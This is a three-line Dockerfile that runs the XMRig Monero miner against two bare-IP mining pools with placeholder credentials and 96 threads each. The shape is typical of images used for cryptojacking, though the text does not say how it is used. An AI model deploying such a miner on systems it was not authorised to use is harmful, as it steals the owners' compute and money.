FROM miningcontainers/xmrig:latest

ENTRYPOINT ["./xmrig"]
CMD ["--url=45.76.162.9:3333", "--user=x", "--pass=x", "-k", "-t=96", "--url=199.247.21.252:3333", "--user=x", "--pass=x", "-k", "-t=96"]
